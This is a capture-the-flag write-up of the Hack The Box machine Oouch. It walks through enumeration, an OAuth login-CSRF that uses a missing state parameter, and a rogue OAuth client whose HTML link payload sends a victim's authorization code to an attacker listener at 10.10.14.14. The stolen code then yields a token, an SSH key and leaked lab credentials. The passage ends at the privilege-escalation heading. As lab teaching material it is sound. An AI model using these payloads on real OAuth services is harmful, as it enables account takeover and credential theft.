  Oouch is a hard difficulty Linux machine featuring web applications that use the OAuth authorization framework. Absence of a CSRF Token is leveraged to link an administrative account to our account, providing access to sensitive information. This information is used to register a new client application and steal the authorization code. This code is used to gain an access token, which provides unrestricted access to user resources. A misconfigured DBus server is then exploited through uWSGI in order to execute code in the context of root.
</div>


<h2 class="relative group">Port Scanning 
    <div id="port-scanning" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#port-scanning" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>From the results of the nmap scan, we see that we have 4 ports open: 21, 22, 5000 and 8000</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">21/tcp   open  ftp     vsftpd 2.0.8 or later
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">49</span> Feb <span class="m">11</span>  <span class="m">2020</span> project.txt
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">5000/tcp open  http    nginx 1.14.2
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Welcome to Oouch
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was http://10.10.10.177:5000/login?next<span class="o">=</span>%2F
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.2
</span></span><span class="line"><span class="cl">8000/tcp open  rtsp
</span></span></code></pre></div>
<h2 class="relative group">FTP 
    <div id="ftp" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#ftp" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>From the nmap results, we can see that we have anonymous login allowed and we can access <code>project.txt</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp 10.10.10.177
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Connected to 10.10.10.177.
</span></span><span class="line"><span class="cl"><span class="m">220</span> qtc<span class="err">&#39;</span>s development server
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.10.177:squ4r00t<span class="o">)</span>: anonymous
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>48291<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> ftp      ftp            <span class="m">49</span> Feb <span class="m">11</span>  <span class="m">2020</span> project.txt
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; get project.txt
</span></span><span class="line"><span class="cl">local: project.txt remote: project.txt
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>40240<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> project.txt <span class="o">(</span><span class="m">49</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>***************************************************************************************<span class="p">|</span>    <span class="m">49</span>       65.01 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">49</span> bytes received in 00:00 <span class="o">(</span>0.94 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.
</span></span></code></pre></div><p>And the file contains the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Flask -&gt; Consumer
</span></span><span class="line"><span class="cl">Django -&gt; Authorization Server
</span></span></code></pre></div><p>From this, we can assume that there is an Oauth system in place and that the Django server is the Authorization Server and the Flask server is the consumer / client app.</p>

<h2 class="relative group">Website at :5000 
    <div id="website-at-5000" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#website-at-5000" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Navigating to <code>http://10.10.10.177</code>, we are redirected to <code>/login?next=%2f</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_homepage.png" alt="" />
  <figcaption>Login Page</figcaption>
  
  </figure>
<p>We can also register an account at <code>/register</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_register.png" alt="" />
  <figcaption>Register Page</figcaption>
  
  </figure>
<p>Let&rsquo;s try to register an account</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_register_request.png" alt="" />
  <figcaption>Registering an Account</figcaption>
  
  </figure>
<p>After logging in with the newly created account, we get this page:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_after_login.png" alt="" />
  <figcaption>After login</figcaption>
  
  </figure>
<p>We have several other pages on the side bar:</p>
<ul>
<li><strong>Menu</strong>: which is just the home page

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_menu.png" alt="" />
  <figcaption>Menu</figcaption>
  
  </figure></li>
<li><strong>Profile</strong>: This page shows user&rsquo;s information including connected accounts, which might be handy later

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_profile.png" alt="" />
  <figcaption>Profile Page</figcaption>
  
  </figure></li>
<li><strong>Password Change</strong>: Allows us to change password. Uses a CSRF token that is verified

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_password_change.png" alt="" />
  <figcaption>Password Change Page</figcaption>
  
  </figure></li>
<li><strong>Documents</strong>: This page is only accessible to admin users

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_documents.png" alt="" />
  <figcaption>Documents</figcaption>
  
  </figure></li>
<li><strong>About</strong>: From this page we learn that this web app is the authorization server

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_about.png" alt="" />
  <figcaption>About</figcaption>
  
  </figure></li>
<li><strong>Contact</strong>: We are presented a form to report bugs to the administrator

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_contact.png" alt="" />
  <figcaption>Contact</figcaption>
  
  </figure></li>
</ul>
<p>However, XSS attempts are detected and stopped:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_hacking_detected.png" alt="" />
  <figcaption>Hacking Attempt Detected!</figcaption>
  
  </figure>
<p>Let&rsquo;s try to see if there are other pages that we can&rsquo;t access from the web page UI:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s1">&#39;http://10.10.10.177:5000/FUZZ&#39;</span> -w /usr/share/wordlists/dirb/common.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://10.10.10.177:5000/FUZZ
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="o">[</span>Status: 302, Size: 237, Words: 22, Lines: 4, Duration: 91ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">about                   <span class="o">[</span>Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 63ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">contact                 <span class="o">[</span>Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 67ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">documents               <span class="o">[</span>Status: 302, Size: 255, Words: 22, Lines: 4, Duration: 51ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">home                    <span class="o">[</span>Status: 302, Size: 245, Words: 22, Lines: 4, Duration: 86ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">login                   <span class="o">[</span>Status: 200, Size: 1828, Words: 414, Lines: 55, Duration: 93ms<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">logout</span>                  <span class="o">[</span>Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 72ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">oauth                   <span class="o">[</span>Status: 302, Size: 247, Words: 22, Lines: 4, Duration: 48ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">profile                 <span class="o">[</span>Status: 302, Size: 251, Words: 22, Lines: 4, Duration: 79ms<span class="o">]</span>
</span></span><span class="line"><span class="cl">register                <span class="o">[</span>Status: 200, Size: 2109, Words: 517, Lines: 64, Duration: 132ms<span class="o">]</span>
</span></span></code></pre></div><p>We see a new endpoint, <code>/oauth</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_oauth.png" alt="" />
  <figcaption>OAuth Endpoint</figcaption>
  
  </figure>
<p>After adding <code>consumer.oouch.htb</code> and <code>oouch.htb</code> to the hosts file, and trying to go to <code>http://consumer.oouch.htb:5000/oauth/connect</code>, we are redirected to the following URL: <code>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read</code> which is the site on port 8000.</p>
<p>Let&rsquo;s also add <code>authorization.oouch.htb</code> to our hosts file.</p>

<h2 class="relative group">Website at :8000 
    <div id="website-at-8000" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#website-at-8000" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Navigating once again to the previous URL, we land on this page:</p>
<p>
<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_login.png" alt="" />
  <figcaption>OAuth Server Login Page :8000/login</figcaption>
  
  </figure>
<figure>
      <img class="my-0 rounded-md" src="" alt="" />
  
  
  </figure></p>
<p>Before moving forward, let&rsquo;s have a look at how Oauth works.</p>

<h3 class="relative group">How Oauth works ? 
    <div id="how-oauth-works-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#how-oauth-works-" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Oauth is an authorization framework that allows one website (consumer/client app) to access a user&rsquo;s data from another website (oauth server/provider) without knowing the user&rsquo;s password.</p>
<blockquote>
<p>For more information -&gt; <a
  href="https://portswigger.net/web-security/oauth"
    target="_blank"
  >https://portswigger.net/web-security/oauth</a></p></blockquote>
<p>Let&rsquo;s take a look at the following diagram from <a
  href="https://portswigger.net/web-security/oauth/grant-types"
    target="_blank"
  >PortSwigger</a> showing the different steps involved:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/oauth_workflow.jpg" alt="" />
  <figcaption>OAuth Worflow for Authorization Code Grant Type</figcaption>
  
  </figure>
<ol>
<li>
<p><strong>Authorization request</strong>: This is the first request that initiates the Oauth process. It is sent by the consumer to the Oauth server through the user&rsquo;s browser. In our case, it corresponds to this request:</p>

    <figure>
          <img class="my-0 rounded-md" src="/img/htb/oouch/auth_req.png" alt="" />
      <figcaption>Authorization Request</figcaption>
      
      </figure>
<p>In this request, the consumer also sends his <code>client_id</code> in order to authenticate to the Oauth server, the <code>response_type</code> parameter indicating the <a
  href="https://portswigger.net/web-security/oauth/grant-types"
    target="_blank"
  >grant type</a>, <code>redirect_uri</code> which is the page that the user will be redirected to after consenting, finally <code>scope</code> indicating operations to be done with the accessed data (&lsquo;read&rsquo; in this case).</p>
</li>
<li>
<p><strong>User Login &amp; Consent</strong>: After the first request is sent, the user is sent to the OAuth provider page so that they can login and consent to authorize the client application to access their data.</p>
</li>
<li>
<p><strong>Authorization Code Grant</strong>: Once the user consents, they are redirected to the URL that was provided through the <code>redirect_uri</code> parameter along with the authorization code. This authorization code is linked to the user account on the OAuth server/provider website.</p>
</li>
<li>
<p><strong>Access Token Request</strong>: Using the previous authorization code, the client application will contact directly the Oauth server (without going through the user&rsquo;s browser) asking for a token.</p>
</li>
<li>
<p><strong>Access Token Grant</strong>: After doing some verifications, the OAuth server will send the token to the client application, allowing it to access user data.</p>
</li>
<li>
<p><strong>API Call</strong>: The client application makes an API call to retrieve user data</p>
</li>
<li>
<p><strong>User Data</strong>: The OAuth server checks the token and sends the data.</p>
</li>
</ol>

<h3 class="relative group">Understanding Oouch&rsquo;s OAuth Flow 
    <div id="understanding-oouchs-oauth-flow" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#understanding-oouchs-oauth-flow" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Going back a little bit, we notice that when we tried to connect another account to our existing account on <code>consumer.oouch.htb:5000</code> through the <code>/oauth/connect</code> endpoint, it triggered the OAuth flow by redirecting us to the OAuth server on <code>authorization.oouch.htb:8000/oauth/authorize</code> along with the following parameters:</p>
<ul>
<li><code>client_id</code></li>
<li><code>response_type</code></li>
<li><code>redirect_uri</code></li>
<li><code>scope</code></li>
</ul>
<p>This represent the first step, or the <strong>&ldquo;Authorization request&rdquo;</strong>, referring to the previous diagram.</p>
<p>After that we&rsquo;re then redirected once again to the login page of the OAuth server at <code>authorization.oouch.htb:8000/login/</code> where the application expects us to login and consent (this is step 2).</p>
<p>However, right now we don&rsquo;t have an account on the OAuth server website. So we&rsquo;ll need to find a way to create one there.</p>
<p>If we go to <code>authorization.oouch.htb:8000/</code>, we see the following:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_homepage.png" alt="" />
  <figcaption>authorization.oouch.htb:8000/</figcaption>
  
  </figure>
<p>We see in the notice that we can provide SSH credentials. This might be interesting, but for now let&rsquo;s just create an account by going to <code>/signup</code></p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_register.png" alt="" />
  <figcaption>authorization.oouch.htb:8000/signup</figcaption>
  
  </figure>
<p>After creating the account and logging in, we are sent to <code>/home</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_after_login.png" alt="" />
  <figcaption>authorization.oouch.htb:8000/home</figcaption>
  
  </figure>
<p>In this page we&rsquo;re shown the relevant endpoints that are involved in the OAuth process:</p>
<ul>
<li><code>/oauth/authorize</code>: which is the endpoint where the Authorization request is sent (step 1).</li>
<li><code>/oauth/token</code>: which we don&rsquo;t know the use of yet.</li>
</ul>
<p>Now that we have an account on the OAuth server (Oouch), let&rsquo;s connect this account to the account that we have on <code>consumer.oouch.htb:5000</code> by once again going to <code>consumer.oouch.htb:5000/oauth/connect</code>.</p>
<p>This time, since we&rsquo;re already logged in on the OAuth server, we are directly asked to consent:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_consent_burp.png" alt="" />
  <figcaption>Authorization Prompt in Burp</figcaption>
  
  </figure>
<p>Once we click on Authorize, we&rsquo;re redirected to our user profile at <code>consumer.oouch.htb:5000/profile</code>, and we see that our account on Oouch (the OAuth server) is now linked:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_profile_connected.png" alt="" />
  <figcaption>Oouch account linked!</figcaption>
  
  </figure>
<p>When we clicked on Authorize, the following POST request was sent:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_consent_post_request.png" alt="" />
  <figcaption>Consent POST Request</figcaption>
  
  </figure>
<p>which lead to a redirect to: <code>consumer.oouch.htb:5000/oauth/connect/token?code=&lt;AUTH_CODE&gt;</code>.</p>
<p>When we hit that endpoint, it will check if the authorization code (<code>code</code> parameter) is valid. If so, the account linked to the authorization code (in this case the account we created on the OAuth server: <code>squ4r00t_oouch</code>) will be linked to the consumer web application.</p>
<p>We also notice something interesting: the <code>state</code> parameter is empty. The absence of this parameter potentially means that an attacker can initiate an OAuth flow themselves before tricking a user&rsquo;s browser into completing it, similar to a traditional CSRF attack.</p>

<h3 class="relative group">OAuth Exploitation: Part 1 
    <div id="oauth-exploitation-part-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#oauth-exploitation-part-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>We&rsquo;ll initiate the OAuth process normally until we arrive at the moment we&rsquo;re redirected to <code>consumer.oouch.htb:5000/oauth/connect/token?code=&lt;AUTH_CODE&gt;</code> at which point (<strong><em>without following the redirect!</em></strong>) we&rsquo;ll try to make the administrator access that link. This will tie our account (the one on the OAuth server: <code>squ4r00t_oouch</code>) to the administrator&rsquo;s account (the one on the consumer: port 5000).</p>
<p>We&rsquo;ll send the following payload in the contact form:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://consumer.oouch.htb:5000/oauth/connect/token?code=a1b2.....xyz&#34;</span><span class="p">&gt;</span>click here!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div>
  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  
  >
  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    
    >
    <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span>
  </span>

  <span
    
      class="dark:text-neutral-300"
    
    >Make sure to replace the authorization code with a valid one tied to your account on the Authorization server.</span>
</div>


<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_link_sent.png" alt="" />
  <figcaption>CSRF link sent to admin</figcaption>
  
  </figure>
<p>After a few second, we see that our Oouch account not linked anymore:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_no_accounts_linked.png" alt="" />
  <figcaption>No Accounts Connected.</figcaption>
  
  </figure>
<p>Let&rsquo;s try to logout, and login with our Oouch account at <code>consumer.oouch.htb:5000/oauth/login</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_qtc_linked.png" alt="" />
  <figcaption>Logged in as qtc.</figcaption>
  
  </figure>
<p>We can see that our Oouch account was linked to qtc&rsquo;s account.</p>
<p>Now if we go to <code>/documents</code>, we see something different:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web5000_documents_qtc.png" alt="" />
  <figcaption>qtc&rsquo;s documents.</figcaption>
  
  </figure>
<p>From this we learn:</p>
<ul>
<li>We have developer credentials we can use for &ldquo;application registration&rdquo; <code>develop:supermegasecureklarabubu123!</code></li>
<li><code>/api/get_user</code> to get user data (returns a 403)</li>
<li><code>/oauth/authorize</code> supports GET method</li>
<li>There is an ssh key to be found somewhere</li>
</ul>

<h3 class="relative group">OAuth Exploitation: Part 2 
    <div id="oauth-exploitation-part-2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#oauth-exploitation-part-2" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Let&rsquo;s try to find others endpoints under <code>/oauth/</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u <span class="s1">&#39;http://authorization.oouch.htb:8000/oauth/FUZZ&#39;</span> -w /usr/share/wordlists/dirb/common.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://authorization.oouch.htb:8000/oauth/FUZZ
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">applications            <span class="o">[</span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 50ms<span class="o">]</span>
</span></span></code></pre></div><p>Going to <code>/oauth/applications</code> presents us with a login prompt and trying the credentials we found in qtc&rsquo;s documents doesn&rsquo;t work.</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_applications.png" alt="" />
  <figcaption>HTTP Basic Auth</figcaption>
  
  </figure>
<p>After some more enumeration, we find the <code>/oauth/applications/register</code> endpoint where the credentials worked.</p>
<p>We are then directed to the application registration page:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_applications_register.png" alt="" />
  <figcaption>Application Registration Page</figcaption>
  
  </figure>
<p>Client id and client secret are provided by the application. Clicking on save will register our new application to the OAuth server:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_applications_created.png" alt="" />
  <figcaption>Application Created!</figcaption>
  
  </figure>
<p>Now that our application is created, we use it with the CSRF in the contact form in order to trick the user to authorize our application. Once they do, we&rsquo;ll receive the authorization code (tied to their account) which we can then use to request an access token that will allow us to authenticate as them.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  
  >
  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    
    >
    <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span>
  </span>

  <span
    
      class="dark:text-neutral-300"
    
    >Don&rsquo;t forget to setup a listener on the return URL to catch the authorization token</span>
</div>

<p>We can use the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://authorization.oouch.htb:8000/oauth/authorize/?client_id=dQ8riRsCow9njRJOLr35uzUg0imhn9SAq8o3bawX&amp;response_type=code&amp;redirect_uri=http://10.10.14.14/pwned&amp;scope=read&amp;allow=Authorize&#34;</span><span class="p">&gt;</span>click!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>Notice <code>&amp;allow=Authorize</code> (originally in the request POST body) was added to the URL parameters since this endpoint is said to allow the GET method.</p></blockquote>
<p>After a few seconds, we get the authorization code on our netcat listener:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/nc_listener_auth_code.png" alt="" />
  <figcaption>Authorization Code!</figcaption>
  
  </figure>
<p>Now we can request a token on the <code>/oauth/token</code> endpoint we found earlier:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_get_token.png" alt="" />
  <figcaption>Got the Bearer token!</figcaption>
  
  </figure>
<p>Using this token, we can for example, access <code>/api/get_user</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_api_getuser.png" alt="" />
  <figcaption>Information about qtc</figcaption>
  
  </figure>
<p>After more enumeration for other api endpoints, we find <code>/api/get_sshkey</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/web8000_api_getsshkey.png" alt="" />
  <figcaption>qtc&rsquo;s ssh key</figcaption>
  
  </figure>
<p>Using the ssh key, we can login as qtc and retrieve the user flag:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/user_flag.png" alt="" />
  <figcaption>User flag obtained !</figcaption>
  
  </figure>

<h2 class="relative group">Privesc 
    <div id="privesc" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#privesc" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">qtc -&gt; www-data 
    <div id="qtc---www-data" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
